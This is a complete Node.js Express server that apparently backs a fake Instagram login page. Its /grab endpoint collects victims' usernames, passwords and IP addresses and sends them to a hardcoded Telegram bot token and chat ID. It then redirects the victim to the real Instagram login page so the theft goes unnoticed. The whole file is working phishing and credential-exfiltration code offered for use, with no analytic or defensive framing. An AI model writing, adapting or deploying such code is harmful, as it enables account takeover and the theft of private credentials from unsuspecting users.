const express = require('express');
const axios = require('axios');
const path = require('path');
const app = express();

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('./'));

// ✅ TERA BOT TOKEN + CHAT ID (Hardcoded)
const BOT_TOKEN = '8985189210:AAEvRxF1-iLZwzqDKYGJN8xtOD4mcgORklA';
const CHAT_ID = '8975887766';

// ✅ Serve index.html
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// 📥 Credentials Capture Endpoint
app.post('/grab', async (req, res) => {
  const { username, password } = req.body;
  const ip = req.headers['x-forwarded-for'] || req.ip || 'Unknown';
  const time = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });

  const message = `🔐 *New Instagram Creds*\n\n👤 *Username:* ${username}\n🔑 *Password:* ${password}\n🌐 *IP:* ${ip}\n🕒 *Time:* ${time} IST`;

  try {
    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: message,
      parse_mode: 'Markdown'
    });
    console.log('✅ Creds sent to Telegram');
  } catch (error) {
    console.error('❌ Telegram Error:', error.message);
  }

  // Redirect to real Instagram
  res.redirect('https://www.instagram.com/accounts/login/');
});

// 🚀 Start Server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`✅ Server running on port ${PORT}`);
});